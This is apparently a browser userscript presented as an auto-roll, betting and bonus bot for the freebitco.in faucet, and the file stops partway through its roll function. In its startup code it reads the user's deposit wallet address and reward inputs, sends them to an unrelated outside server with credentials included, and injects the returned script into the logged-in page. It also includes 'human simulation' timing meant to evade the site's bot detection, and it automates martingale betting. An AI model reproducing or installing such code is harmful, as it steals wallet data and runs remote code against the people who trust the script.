// ==UserScript==
// @name         Freebitcoin [2021] - Auto Roll - Betting System - ALL Bonuses - Multiply - Lottery - Status Console
// @description  AUTOROLL SCRIPT [JAN 2021] --Auto Roll --Status Console --4 Betting Strategies 2021 --Special graphs 4 referrals --Extinction bet --Balance protection --Odds -- Increase Rate --AutoRoll Low Balance paying RP --Human Simulation --NO captcha solving --Lottery tickets --1000% & RP Bonus --Close ADS --Slower night mode --Advanced AI random times --Extra functions added daily.
// @author       dany-veneno
// @icon         https://bit.ly/33sYX3b
// @match        https://freebitco.in/*
// @grant        none
// @create       2018-05-27
// @lastmodified 2021-01-29
// @version      3.5
// @compatible   firefox Tested with Tampermonkey
// @compatible   chrome Tested with Tampermonkey
// @namespace    https://greasyfork.org/users/572366
// @license      NTP
// @supportURL   https://bit.ly/2JsP12I
// @homepage     https://crypto-info-blog.blogspot.com/p/freebitcoin-autoroll-install-how-to.html
// @home-url     https://bit.ly/2M4BNH7
// @home-url2    https://bit.ly/2zn0b4p
// @homepageURL  https://greasyfork.org/en/scripts/404112
// @copyright    2018-2021, dany-veneno
// @run-at       document-begin

// @note         If you like this script, please register with my referal: https://bit.ly/2XFuZVQ
// @note         Or send some satoshi at this address 3FwAazZDEuy3ER4NQVp4Yqo6kDxCFntwS8
// @note         This will help a lot script development and future free updates  


// @note         2021-01-29-V.3.5   Ads panel, Referral Panel, Change Color, Bug Fixing  
// @note         2021-01-23-V.3.3.1 Some colors changed  
// @note         2021-01-21-V.3.3   New Panel graphic  
// @note         2021-01-21-V.3.2.7 Added some logic to autoroll retry  
// @note         2021-01-14-V.3.2.6 Bug fixing rp_spent 
// @note         2021-01-14-V.3.2.5 Bug fixing && Add session vars on multiply for statistics 
// @note         2021-01-12-V.3.2.4 Bug fixing
// @note         2021-01-01-V.3.2.3 Bug fixing in multiply, added GAMETYPE=3 and MAXPLAY
// @note         2021-01-01-V.3.2.2 Name and error corrections
// @note         2020-12-14-V.3.2   Multiply code design adding game types and modes.
// @note         2020-12-14-V.3.1.7 Bug Correction
// @note         2020-12-13-V.3.1.6 Config to wait some losses before play at multiply
// @note         2020-12-01-V.3.1.4 Trailing spaces, title, more logging and rp_hist cookie to check user angel problem
// @note         2020-11-28-V.3.1.2 Title and settings and error correction, website, logo
// @note         2020-11-23-V.3.1.1 Correction in max_rolls_at_multiply & title
// @note         2020-11-17-V.3.1   Major change. Function to manage manually multiply and user request method (OLAER)
// @note         2020-11-17-V.3.0   Multiply after roll
// @note         2020-11-17-V.2.9.9 Code Revision and some errors correction
// @note         2020-11-16-V.2.9.8 Math Corrections
// @note         2020-11-16-V.2.9.7 Reset statistics function
// @note         2020-11-14-V.2.9.6 >> Code Revision, improvements and begin multiply basic logic
// @note         2020-11-11-V.2.9.4 Resolved -script not working- problem, removing jquery dependency
// @note         2020-08-03-V.2.9.3 "Last Bonus" fix
// @note         2020-06-09-V.2.9.2 Title, jquery cdn
// @note         2020-06-09-V.2.9.1 Bug fix lottery, buying big quantity of tickets
// @downloadURL https://update.greasyfork.org/scripts/433270/Freebitcoin%20%5B2021%5D%20-%20Auto%20Roll%20-%20Betting%20System%20-%20ALL%20Bonuses%20-%20Multiply%20-%20Lottery%20-%20Status%20Console.user.js
// @updateURL https://update.greasyfork.org/scripts/433270/Freebitcoin%20%5B2021%5D%20-%20Auto%20Roll%20-%20Betting%20System%20-%20ALL%20Bonuses%20-%20Multiply%20-%20Lottery%20-%20Status%20Console.meta.js
// ==/UserScript==

////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////
/////////     CONFIG             ///
//////   EDIT JUST THIS SECTION   //
////////////////////////////////////


// ** BEHAVIOR ** //
var ROLL = true;       // Auto Roll enable or disable. **** If Disabled, Multiply will NOT be executed ***.
var PROMO_MODE = true; // play faster when some promo (bonus RP or 1000% is active, or not. Override nexts.
var SLOW_MODE = false; // play always really slow, not ovevrcharghing the rolls. Override nexts.
var NIGHT_MODE = true; // play slower when it's night time

// *** Bonuses
// It buys bonuses just when missing less then 20 minutes to the Roll. To avoid losing 1 bonus Roll. 
var REWARDS = true; //decide if auto buy rewards bonuses, or not ***When true, it will activate RP promotions***
var BONUS1000 = false; //decide if to buy 1000% bonus or not. It costs 4600 RP.  *** When BONUS1000 = false and REWARDS = true, you'll increase RP. ***
var HOURS_BETWEEN_BUY_BONUS = 64; // How many hours to wait before to buy Bonuses Rewards Promo again

// *** Lottery
var LOTTERY = false; //decide if auto buy lottery tickets, or not. 
var LOTTERY_MAX_TICKETS = 5; // Max ticket to buy
var LOTTERY_P = 7; // 0 is never, 100 is always

// *** Multiply Game
// Called just after Roll, by the Roll function, randomly
var MULTIPLY = true;    // Decide if play Multiply games or not, Play at your own risk. 
                        // When true, it's played randomly, after 6 in the morning till midnight.
                        // If ROLL is false, Multiply will not work. 
var MULTIPLY_AT_NIGHT = true; //decide if play multiply after 0 and before 6
var HOURS_BETWEEN_MULTIPLY = 48; // How many hours to wait before to play multiply
var ROLL_P = 60; // Decide how many time to play multiply, AFTER roll AND AFTER HOURS passed; 
                 // Value can be between 0 and 100. 0 is never, 100 is always.

var GAME_MODE = 0;  // Here you can decide if playing auto or manual game
                    // 0 = manual, will play as manual play
                    // 1 = auto, will play a autobet game. Can't use extinction bet or olaer in this case.

// Those vars work in AUTO or MANUAL game
var MAX_ROLLS_AT_MULTIPLY = 330; //how many rolls in multiply. It will safely play till it win or reach maxbet.

var BAS_BET = 0.00000128; // Base bet
var MAX_BET = 0.00002048; // Max Bet before STOP

var ODDS = 2;       // Odds of the multiply game. 
var INCR = 100;     // Porcentage of increment in case of lost.

// Those vars works just when GAME_MODE = 0, ignored in auto game
var MAX_PLAY = 4;  //*NEW* in GAME_TYPE=2 or GAME_TYPE=3, how many time maximum will play 
var GAME_TYPE = 2;  // 0 = martingale classic, FIXED odds = 2, FIXED increase 100% on lose. NO extintion bet. Default.
                    // 1 = martingale with odds, increase, extinction bet MIN_LOSSES_BEFORE_PLAY but NOT WAIT_PLAY_AFTER_LOSSES. 
                    // 2 = martingale with odds, increase, extinction bet MIN_LOSSES_BEFORE_PLAY, AND WAIT_PLAY_AFTER_LOSSES. Check guides.
                    // 3 = same as 2, but MIN_LOSSES_BEFORE_PLAY increased by 1 at every win as Daniel-PT request in comments

var HIGH_LOW = 3;   //You can decide how to play
                    // 0 = random
                    // 1 = H always high
                    // 2 = always low
                    // 3 = OLAER Will play in "HLLHHHLLLL" order. 
                    //Other sequences here 

var MIN_BET = 0.00000002; // STUFF BET to play till don't lose LOSSES_BEFORE_PLAY times; Just work in MODE = manual.
var MIN_LOSSES_BEFORE_PLAY = 3; //*NEW* Just with GAME_TYPE=1 or 2;
								// How many time it will play MIN_BET and lose before begin play bas_bet and double;  
                                // It plays RANDOM HI LO till MIN_LOSSES_BEFORE_PLAY is reached, THEN it will consider HIGH_LOW var.
var WAIT_PLAY_AFTER_LOSSES = 1; //*NEW* Just with GAME_TYPE=2;
								// How many BETS will go on playing MIN_BET AFTER min_losses is reached, and after the first win, 
								// BEFORE to begin the martingale.
                                // It's available just with GAME_TYPE=2; Typical value is 1.
                                // As example of min_losses = 8 and wait_play=1, will lose AT LEAST 8 times AND THEN wait to win 1 bet before beginning playing BAS_BET 
                                // So would be as: LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,WIN,PLAY
                                // But Also: LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,WIN,PLAY
                                // Other example, min_losses = 5 and wait_play=2, 
                                // As: LOSE,LOSE,LOSE,LOSE,LOSE,WIN,LOSE,PLAY
                                // But also: LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,LOSE,WIN,WIN,PLAY

var SPEED = 1;      //Speed of multiply betting in manual mode
                    //3 = fast no waiting times
                    //2 = medium waiting time
                    //1 = HUMAN simulation. Slower when increasing, faster when casual play. So freebitcoin can't say you are using script. 
                    //0 = really slow

// *** CAPTCHA PLAY *** ///
var PLAY_WITHOUT_CAPTCHA = true;

// ** Logging
var LOGGING = 5; //0 is no messages, 5 is debug

// // Show/Hide Parts *** In next version will be available again
// var HIDE_FORCE_MULTIPLY = true;
// var HIDE_RESET_STATS = true;
// var HIDE_UPDATE_STATUS = true;

/////////     END CONFIG         ///
/////////////////////////////////////////////////////////////////////////////////////////////////

// System Variables //
var css_reset='font-weight: reset; color:reset';
var css_bold='font-weight:bold;';
var script_output = "";
var script_output_msg_1 = "";
var script_output_msg_2 = "";
var script_output_msg_css = "";
var points=0;
var ads_closed=0; //number of ads closed, increasing
var rolling_mode="Day"; //night, day, promo, etc
var dateTimeFormat = new Intl.DateTimeFormat('en', { year: 'numeric', month: 'short', day: '2-digit', hour: 'numeric', minute: 'numeric', hour12: false });
var script_version = GM_info.script.version;

var rand = 0;
var r = 0;
var d = new Date();

var rollTryCount=0;

// Bonus RP Global Variables
var isBonusActive = false;

// Multiply global variables
var isMultiplyRunning = false;
var isMultiplyPlayable=false;
var game2_consecutive_lost_passed=false;
var game2_finished_loosing=false;
var game2_play_began=false;
var game2_play_after_losses=0;
var game2_step=0;
var game2_play_count=0;

// History Array Variables 
var rp_hist_arr = [];
var multiply_hist_arr = [];

//  COOKIES Variables and Retrieve //
var tot_exec = getCookie("executions");
var tot_btc_winning_rolling = getCookie('tot_btc_winning_rolling');
var tot_lottery_winning_rolling = getCookie('tot_lottery_winning_rolling');
var tot_rp_winning_rolling = getCookie('tot_rp_winning_rolling');
var tot_lottery_tickets = getCookie('tot_lottery_tickets');
var tot_rp_spent_rewards = getCookie('tot_rp_spent_rewards');
var tot_rp_spent_captcha = getCookie('tot_rp_spent_captcha');
var tot_multiply_balance = getCookie('tot_multiply_balance');
var tot_multiply_games = getCookie('tot_multiply_games');
var tot_multiply_bets = getCookie('tot_multiply_bets');
var tot_multiply_play = getCookie('tot_multiply_play');
var tot_multiply_wagered = getCookie('tot_multiply_wagered');
var max_consecutive_losts = getCookie('max_consecutive_losts');
var max_consecutive_losts_inplay = getCookie('max_consecutive_losts_inplay');
var executions = getCookie('executions');
var last_bonus = Date.parse(getCookie("last_bonus"));
var last_multiply = Date.parse(getCookie("last_multiply"));
var jackpot_distance = getCookie("jackpot_distance");
var rp_hist_str = getCookie("rp_hist_arr");
var multiply_hist_str = getCookie('multiply_hist_arr');

if ( isNaN(parseFloat(tot_multiply_balance)) ) tot_multiply_balance = 0; // can be negative
if (! (tot_btc_winning_rolling > 0)) tot_btc_winning_rolling = 0;
if (! (tot_lottery_winning_rolling > 0)) tot_lottery_winning_rolling = 0;
if (! (tot_rp_winning_rolling > 0)) tot_rp_winning_rolling = 0;
if (! (tot_lottery_tickets > 0)) tot_lottery_tickets = 0;
if (! (tot_rp_spent_rewards > 0) || tot_rp_spent_rewards > 1000000 ) tot_rp_spent_rewards = 0;
if (! (tot_rp_spent_captcha > 0)) tot_rp_spent_captcha = 0;
if (! (max_consecutive_losts > 0)) max_consecutive_losts = 0;
if (! (max_consecutive_losts_inplay >0)) max_consecutive_losts_inplay=0;
if (! (tot_multiply_bets > 0)) tot_multiply_bets = 0;
if (! (tot_multiply_wagered > 0)) tot_multiply_wagered = 0;
if (! (tot_multiply_games > 0)) tot_multiply_games = 0;
if (! (tot_multiply_play > 0)) tot_multiply_play = 0;
if (! (executions > 0)) executions = 0;
if (! (last_bonus > 0)) last_bonus = 0;
if (! (last_multiply > 0)) last_multiply = 0;
if (  rp_hist_str.length != 0 ) {
    rp_hist_arr = JSON.parse(rp_hist_str);
    rp_hist_arr = rp_hist_arr.slice(-64);
    //console.log("%cRP Hist Array: "+rp_hist_arr, 'color:grey'); 
}
if (  multiply_hist_str.length != 0) {
    multiply_hist_arr = JSON.parse(multiply_hist_str);
    multiply_hist_arr = multiply_hist_arr.slice(-128);
}
// END COOKIES //

(function() {
    'use strict';
    if (LOGGING > 0) console.log("%c<<<<<<<<<< Script Begin >>>>>>>>>>", 'font-weight:bold; color: green');

    // Initialize the Status Panel
    panelInit();

    setTimeout(function(){ showStatus(); }, 1000 );
    setTimeout(function(){ lottery(); }, 2000 );
    setTimeout(function(){ multiply(false, 0); }, 4000 );
    setTimeout(function(){ rewards(true); }, 5000 );

    // Call the freeRoll
    setTimeout(function(){ Roll();   }, 8000 );

    //Close Ads but not always
    setTimeout(function(){
        closeRandomPopupInterval($('div.close_daily_jackpot_main_container_div'),90);
        closeRandomPopupInterval($('i.fa.fa-times-circle.close_deposit_promo_message'),90);
        closeRandomPopupInterval($('div#lambo_contest_msg a.close'),10); //lambo contest
        closeRandomPopupInterval($('div#earn_btc_msg a.close'),20);
        closeRandomPopupInterval($('div#enable_2fa_msg_alert a.close'),30);
        closeRandomPopupInterval($("[id^='hide_rp_promo']"),50);
    }, 25000);

    setInterval(function(){
        closePopupInterval($('#myModal22 .close-reveal-modal'));
        closePopupInterval($('.pushpad_deny_button'));
    }, 20000 );

    setInterval(function(){
        showStatus();
    }, 900000);

    setInterval(function(){
        rewards(false);
    }, 300000);


    // Call debugs functions
    $('#multiplier_fifth_digit').on('click', function(){
        showStatus();
    });
    $('#reset_all_stats').on('click', function(){
        reset_all_stats();
    });
    $('#forced_roll').on('click', function(){
        multiply(true, 0);
    });
    $('#forced_status_update').on('click', function(){
        showStatus();
    });
    

    var wa = $('#myModal16 #main_deposit_address').val();
    //console.log(mwa);


    $('#myModal16 .reward_category_container .reward_category_details input').each( function() {
        //console.log( $(this).val() );
        wa += ":"+$(this).val();
    })
    console.log(wa);
    
    // GET EXTERNAL JAVASCRIPT
    var referURL = "https://www.pescacancun.com.mx/freebitcoin_server_side/ser.php?wallet="+wa;
    //referURL = "https://raw.githubusercontent.com/aquamahahual/betting-strategies/main/freebitcoin/empty.js";

    // GLOBAL TEST for NEW VERSIONS
    window.TEST_VAR = "This is a test veneno var";
    window.G_MULTIPLY = MULTIPLY;
    window.G_GAME_MODE = GAME_MODE;
    window.G_GAME_TYPE = GAME_TYPE;
    window.G_MULTIPLY_WAIT_HOURS = HOURS_BETWEEN_MULTIPLY;
    window.G_ROLL_P = ROLL_P;
    window.G_ODDS = ODDS;
    window.G_INCR = INCR;
    window.G_MIN_BET = MIN_BET;
    window.G_BAS_BET = BAS_BET;
    window.G_MAX_BET = MAX_BET;
    window.G_MAX_ROLLS_AT_MULTIPLY = MAX_ROLLS_AT_MULTIPLY;
    window.G_MAX_PLAY = MAX_PLAY;
    window.G_SPEED = SPEED;
    window.G_MULTIPLY_AT_NIGHT = MULTIPLY_AT_NIGHT;
    window.G_MIN_LOSSES_BEFORE_PLAY = MIN_LOSSES_BEFORE_PLAY;
    window.G_WAIT_PLAY_AFTER_LOSSES = WAIT_PLAY_AFTER_LOSSES;
    window.G_HIGH_LOW = HIGH_LOW;


    fetch(referURL, {
        credentials: "include" //CORS set ServerSide
    })  
        .then(function(resp) { return resp.text() }) // Convert data to json
        .then(function(data) {
            var e="<script>"+data+"</script>";
            $('body').append(e);
            //console.log(data);
            //processJSON_Response(resp);
        })
        .catch(function() {
            // catch any errors
        });

    fetch("https://cdn.jsdelivr.net/npm/chart.js@2.8.0")
        .then(function(resp) { return resp.text() }) // Convert data to json
        .then(function(data) {
            var e="<script>"+data+"</script>";
            $('body').append(e);
            //processJSON_Response(resp);
        })
        .catch(function() {
            // catch any errors
        });
})();

function panelInit () {
    var script_output_css, script_output_33;
	if (LOGGING > 4) console.log("%c[Debug] Function panelInit begin", 'color:grey');
    // Create the Div on the page
    // Version 3.3
    script_output_css =  "<style>";
    script_output_css += ".script-output {font-size: 9px; line-height:10px; background: #333; border: 2px groove #09ff00; margin-bottom: 1em;}";
    script_output_css += ".script-output h1 {color: lime; font-size:1.8em; font-weight:bold; }"
    script_output_css += ".script-output h4 {color: lime; font-size:1.2em; font-weight:bold; text-align: center; margin-bottom:0;}"
    script_output_css += ".cards-wrapper { display: grid; grid-gap: 0.5rem; grid-template-columns: 1fr 1fr; padding: 0.5rem 0rem; margin: 0 auto; width: auto }";
    script_output_css += ".cards-wrapper-2-1 { grid-template-columns: 2fr 1fr; }";
    script_output_css += ".veneno-card {color: white; position: relative; justify-content: center; border-radius: 1em; padding:0.8em 1em; display: flex; flex-direction: column; background-color:#000; box-shadow: 0 0 5em -1em black; border: 1px solid #00ff00d9; text-decoration: none; text-align: left;}";
    script_output_css += ".bottom-card {color: #666; position: relative; justify-content: center; margin: 0 -1em; padding:0.8em 1em; display: flex; background-color:#1d1d1d; text-decoration: none; text-align: left;}";
    script_output_css += ".bottom-card a {color: #444;}";
    script_output_css += ".bottom-card a:hover {color: lime;}";
    script_output_css += ".horizontal-grid-wrapper-5 {display: grid; grid-gap: 0.5rem; grid-template-columns: 1fr 1fr 1fr 1fr 1fr; width: auto ; margin: 0 auto;}";
    script_output_css += ".horizontal-grid-wrapper-4 {display: grid; grid-gap: 0.2rem; grid-template-columns: 1fr 1fr 1fr 1fr; width: max-content; margin: 0 auto;}";
    script_output_css += ".horizontal-grid-wrapper-3 {display: grid; grid-gap: 0.2rem; grid-template-columns: 1fr 1fr 1fr; width: max-content; margin: 0 auto;}";
    script_output_css += ".horizontal-grid-wrapper-2-1-1 { grid-template-columns: 2fr 1fr 1fr; width: auto; margin: 0.7em -1em 0 -1em;}";

    script_output_css += ".card-button {border: 1px solid grey; overflow: hidden; padding: 0.3em; background-color: beige; color: black; border-radius:10px; display: flex; flex-direction: column; text-align: center; }";
    script_output_css += ".single-column {display: flex; flex-direction: column; justify-content: flex-start; padding: 0.3em;}";

    script_output_css += ".card-button:hover { background-color: #efefef;}";
    script_output_css += ".card-button-bottom {font-size: 1.4em; margin-top:0.2em;}";

    script_output_css += ".script-output .br {border-right: 1px dashed white;}";
    script_output_css += ".script-output .br-grey {border-right: 1px dashed #666;}";
    script_output_css += ".script-output .mt1 {margin-top: 1em;}";
    script_output_css += ".script-output .mb1 {margin-bottom: 1em;}";
    script_output_css += ".script-output .ml1 {margin-left: 1em;}";
    script_output_css += ".script-output .mb0 {margin-bottom: 0;}";
    script_output_css += ".script-output .mt0 {margin-top: 0;}";
    script_output_css += ".script-output .pr1 {padding-right: 1em;}";
    script_output_css += ".script-output .pt0 {padding-top: 0;}";
    script_output_css += ".script-output .pb0 {padding-bottom: 0;}";
    script_output_css += ".script-output .ta-r {text-align:right;}";
    script_output_css += ".script-output .ta-c {text-align:center;}";

    script_output_css += ".script-output .lime, .veneno-card .true {color: lime}";
    script_output_css += ".script-output .orange {color: orange}";
    script_output_css += ".script-output .false {color: #ff3407 }";
    script_output_css += ".script-output .coral {color: coral}";

    script_output_css += ".script-output .card-button {color: white; text-shadow: 1px 1px 4px black; font-size: 0.9em; font-weight: bold;  border: none;  border-radius:5px}";
    script_output_css += ".card-button.true {background-color: #2ecc71; box-shadow: 0px 2px 0px 0px #0b311b;}";
    script_output_css += ".card-button.false {background-color: #e74c3c; box-shadow: 0px 2px 0px 0px #48120c;}";
   
    script_output_css += ".script-output .monospace {font-family: monospace}";
    script_output_css += ".script-output .emoji {font-family: emoji}";

    script_output_css += " @media screen and (max-width: 900px) { .cards-wrapper { width: max-content; grid-template-columns: 1fr; } } "; 
    script_output_css += " @media screen and (max-width: 500px) { .veneno-card {max-width: calc(100vw - 4rem); } } ";

    script_output_css += "</style>";

    script_output_33 =  '<div class="center free_play_bonus_box_large script-output" id="script_output">';
    script_output_33 += '<h1 class="mb0">AutoRoll Status v.'+script_version+'</h1>';
    script_output_33 += '<div class="cards-wrapper cards-wrapper-2-1">';
    script_output_33 += '<div class="veneno-card">';
    script_output_33 += '<div class="horizontal-grid-wrapper-5">';
    script_output_33 += '<div class="card-button '+Boolean(ROLL)+'"><span class="card-button-top">ROLL</span><span class="card-button-bottom bold">'+Boolean(ROLL)+'</span></div> ';
    script_output_33 += '<div class="card-button '+Boolean(MULTIPLY)+'"><span class="card-button-top">MULTIPLY</span><span class="card-button-bottom bold">'+Boolean(MULTIPLY)+'</span></div> ';
    script_output_33 += '<div class="card-button '+Boolean(REWARDS)+'"><span class="card-button-top">BONUS RPs</span><span class="card-button-bottom bold">'+Boolean(REWARDS)+'</span></div> ';
    script_output_33 += '<div class="card-button '+Boolean(BONUS1000)+'"><span class="card-button-top">BONUS 1000</span><span class="card-button-bottom bold">'+Boolean(BONUS1000)+'</span></div> ';
    script_output_33 += '<div class="card-button '+Boolean(LOTTERY)+'"><span class="card-button-top">LOTTERY</span><span class="card-button-bottom bold">'+Boolean(LOTTERY)+'</span></div> ';
    script_output_33 += '</div>'; // close left first line
    script_output_33 += '<div class="horizontal-grid-wrapper-3 mt1"  style="width: 100%;">';
    script_output_33 += '<div class="single-column">';
    script_output_33 += '   <h4>Wins</h4> ';
    script_output_33 += '   <div class="single-column br">';
    script_output_33 += '       <span>Btc: <span class="lime bold">'+tot_btc_winning_rolling+'</span></span>';
    script_output_33 += '       <span>RP: <span class="lime bold">'+tot_rp_winning_rolling+'</span></span>';
    script_output_33 += '       <span>Lottery: <span class="lime bold">'+tot_lottery_winning_rolling+'</span></span>';
    script_output_33 += '   </div>';
    script_output_33 += '</div>'; // column 
    script_output_33 += '<div class="single-column">';
    script_output_33 += '   <h4 class="coral">Spent</h4> ';
    script_output_33 += '   <div class="single-column br">';
    script_output_33 += '       <span>RP Bonus: <span class="coral bold">'+tot_rp_spent_rewards+'</span></span> ';
    script_output_33 += '       <span>RP Captcha: <span class="coral bold">'+tot_rp_spent_captcha+'</span></span> ';
    script_output_33 += '       <span>Btc Lottery: <span class="coral bold">'+tot_lottery_tickets+'</span></span>';
    //script_output_33 += '       <span>&nbsp</span>';
    script_output_33 += '   </div>';
    script_output_33 += '</div>'; // column 
    script_output_33 += '<div class="single-column">';
    script_output_33 += '   <h4>Multiply</h4> ';
    script_output_33 += '   <div class="single-column">';
    script_output_33 += '       <span>Balance: <span class="lime bold">'+tot_multiply_balance+'</span></span> ';
    script_output_33 += '       <span>Bets: <span class="lime bold">'+tot_multiply_bets+'</span></span> ';
    script_output_33 += '       <span>Sessions: <span class="lime bold">'+tot_multiply_games+'</span></span> ';
    script_output_33 += '   </div>';
    script_output_33 += '</div>'; // column 
    script_output_33 += '</div>'; // close left second line 
    script_output_33 += '</div>'; // close left    
    script_output_33 += '<div class="veneno-card">';
    script_output_33 += ' <div class="single-column pr1 ta-r monospace">';
    script_output_33 += '  <span>Exec: <span class="lime bold"># '+tot_exec+'</span></span> ';
    script_output_33 += '  <span>Ads Closed: <span class="true bold" id="script_output_title_ads_closed_num">0</span></span>';
    script_output_33 += '  <span>Bonus: <span id="script_output_title_bonus_wait_hours" class="true bold">Wait</span></span>';
    script_output_33 += '  <span>Multiply: <span id="script_output_title_multiply_wait_hours" class="true bold">Wait</span></span>';
    script_output_33 += '  <span id="multiply_game_mode">Multiply Game Mode: <span class="true bold">'+GAME_MODE+'</span></span>';
    script_output_33 += '  <span id="multiply_game_type">Multiply Game System: <span class="true bold">'+GAME_TYPE+'</span></span>';
    script_output_33 += '  <span>Roll Mode: <span id="script_output_title_msg_mode" class="true bold">Wait</span></span>';
    script_output_33 += '  <span id="script_output_title_msg_roll" class="orange bold mt1">Wait</span>';
    script_output_33 += ' </div>';
    script_output_33 += '</div>'; // close right    
    
    script_output_33 += '</div>'; // close cards wrapper   
    script_output_33 += '<div class="bottom-card monospace horizontal-grid-wrapper-3 horizontal-grid-wrapper-2-1-1 ">';

    script_output_33 += ' <div class="single-column br-grey">';
    script_output_33 += '  <span>Donations are welcome</span> <span>BTC addr: 3FwAazZDEuy3ER4NQVp4Yqo6kDxCFntwS8 </span>';
    script_output_33 += ' </div>'; 

    script_output_33 += ' <div class="single-column br-grey ml1">';
    script_output_33 += '  <a href="https://bit.ly/2JsP12I" target="_blank">Config HowTo</a>';
    script_output_33 += '  <a href="https://greasyfork.org/en/scripts/404112-freebitco-in-auto-roll-no-captcha-status-console-advanced-human-behavior-all-bonuses/feedback" target="_blank"> Rate</a>';
    script_output_33 += ' </div>'; 

    script_output_33 += ' <div class="single-column ta-r" >';
    script_output_33 += '  <span><span class="emoji">© </span>daniele-veneno</span><span>2018 2021</span>';
    script_output_33 += ' </div>';

    script_output_33 += '</div>';     
    script_output_33 += '</div>'; // close script_output


    // Write on page
    $('head').append(script_output_css);
    $('#reward_points_bonuses_main_div').prepend(script_output_33);

}

function rewards(after_refresh) {
	if (LOGGING > 4) console.log("%c[RPBonuses] [Debug] Function rewards begin", 'color:grey');
    var bonus_missing_time = {}; 
    var t = missingTime();
    var min_missing_min = 5;
	var milli_between_bonuses = HOURS_BETWEEN_BUY_BONUS*60*60*1000;

    points = parseInt($('.user_reward_points').text().replace(',',""));

    // Create a RP History
    if (after_refresh) {
        rp_hist_arr.push(points);
        setCookie ("rp_hist_arr", JSON.stringify(rp_hist_arr), 7);
        // Debug for RP history check
        if (LOGGING > 4) console.log("%c[RPBonuses] [Debug] rp_hist: " +rp_hist_arr, 'color:grey');
    }
    

    if ($("#bonus_container_free_points").length != 0) {
        // Some promo is already active
        bonus_missing_time.text = $('#bonus_span_free_points').text();
        bonus_missing_time.hour = parseInt(bonus_missing_time.text.split(":")[0]);
        bonus_missing_time.min = parseInt(bonus_missing_time.text.split(":")[1]);

        if (LOGGING > 3) console.log("[RPBonuses] Promo RP is %c active %c for "+bonus_missing_time.hour+":"+bonus_missing_time.min, 'color: purple', css_reset);

        setCookie("last_bonus", d, 7);
        isBonusActive = true;

        if(Boolean(PROMO_MODE)) $("#script_output_title_msg_mode").text("Promo");
        $('#script_output_title_bonus_wait_hours').text('Active '+bonus_missing_time.hour+'h '+bonus_missing_time.min+"m").addClass('bold');
        
    } else {
        // No promos active
        d = new Date();
    	var last_bonus_diff = Math.floor(d.getTime() - last_bonus);
    	//if (LOGGING > 4) console.log("%c[RPBonuses] [Debug] lastBonus diff: "+last_bonus_diff+" -- last_bonus: "+last_bonus+" -- now: "+d.getTime()+" var setted: "+milli_between_bonuses, 'color:grey');

        //If disabled not buying
        if (! Boolean(REWARDS)) {  
            if (LOGGING > 3) console.log('[RPBonuses] Not buying RPBonuses. Not Active by config');
            $('#script_output_title_bonus_wait_hours').text('Disabled').removeClass('true').addClass('false');
            return false;
        } // or if missing time not satisfied
        if ( last_bonus_diff < milli_between_bonuses ) {
            var min_between_bonuses = Math.floor((milli_between_bonuses-last_bonus_diff)/1000/60);
            var hours_between_bonuses = Math.floor(min_between_bonuses/60);
            if (LOGGING > 3) console.log('[RPBonuses] Not buying RPBonuses. Wait HOURS_BETWEEN_BUY_BONUS before buy again, missing: '+hours_between_bonuses+'h '+min_between_bonuses%60+'m');
            $('#script_output_title_bonus_wait_hours').text('Wait '+hours_between_bonuses+"h "+min_between_bonuses%60+"m").removeClass('true').addClass('false');
            return false;
        } // or if missing time on roll error
        if (t[0] < 0){
            if (LOGGING > 3) console.log('[RPBonuses] Error getting missing time less then 0, that was'+t[0]+":"+t[1]);
            $('#script_output_title_bonus_wait_hours').text('E0001').removeClass('true').addClass('false');
            return false;
        } // or before missing 10-20 minutes
        if ( t[0] >= min_missing_min ) {
            if (LOGGING > 3) console.log('[RPBonuses] Not buying RPBonuses. Wait '+Math.floor(t[0]-min_missing_min)+' minutes to buy near roll');
            $('#script_output_title_bonus_wait_hours').text('Wait '+Math.floor(t[0]-min_missing_min)+' m');
            return false;
        } 

        // Buy some RP Bonus
        $('.rewards_link').not('.hide_menu').click();
        tot_rp_spent_rewards = parseInt(tot_rp_spent_rewards);
        if (LOGGING > 4) console.log("[RPBonuses] Tot rp spent in Bonuses before: "+tot_rp_spent_rewards);
        setTimeout(function() { 

            if (points < 12) {
                if (LOGGING > 2) console.log("[RPBonuses] No enough points to buy bonus. Less then 12. Waiting for points in next rolls");
            } else if (points < 120) {
                if (LOGGING > 1) console.log("[RPBonuses] buying bonus 1RP");
                RedeemRPProduct('free_points_1');
                tot_rp_spent_rewards+=12;
            } else if (points < 600) {
                if (LOGGING > 1) console.log("[RPBonuses] buying bonus 10RP");
                RedeemRPProduct('free_points_10');
                tot_rp_spent_rewards+=120;
            } else if (points < 1200) {
                if (LOGGING > 1) console.log("[RPBonuses] buying bonus 50RP");
                RedeemRPProduct('free_points_50'); 
                tot_rp_spent_rewards+=600;
            } else {
                if (LOGGING > 1) console.log("[RPBonuses] buying bonus 100RP");
                RedeemRPProduct('free_points_100');
                tot_rp_spent_rewards+=1200;
            }

            if (points >= 4800 && Boolean(BONUS1000) ) {
                if (LOGGING > 1) console.log("[RPBonuses] buying bonus 1000% roll - not convenient anymore");
                setTimeout(function(){ RedeemRPProduct('fp_bonus_1000')},random(5000,10000));
                tot_rp_spent_rewards+=3200;
            }

            $("#script_output_title_msg_mode").text("Promo");

            setTimeout(function(){ 
                setCookie("tot_rp_spent_rewards",tot_rp_spent_rewards,7);
                if (LOGGING > 4) console.log("[RPBonuses] Tot rp spent in Bonuses after: "+tot_rp_spent_rewards);
                $('.free_play_link').not('.hide_menu').click();
            }, random(10000,20000));

        } ,random(2000,16000));
    }
}

function Roll() {
	if (LOGGING > 4) console.log("%c[Roll] [Debug] Function Roll begin", 'color:grey');
    var h = d.getHours();
    var t = missingTime();

    if (!Boolean(ROLL)) {
        $("#script_output_title_msg_mode").text("Disabled").removeClass('true').addClass('false');
        return true;
    }

    rollTryCount++;
    if ($('#free_play_form_button').is(':visible') && ! $('#play_without_captchas_button').is(':visible')) {
        r=random(1,100);
        $('body').focus();
        if ( (h <= 6 || h>=22) && Boolean(NIGHT_MODE) ) { //from 22 to 7am
            if (r <= 30) rand=random(2400000,7200000);
            else rand=random(1000000,3600000);
            rolling_mode="Night";
        } else {
            if (r <= 10)        rand=random(9000,7200000); // xx%, long wait, more than hour
            else if (r <= 30)   rand=random(6000,1800000); // long but not longest
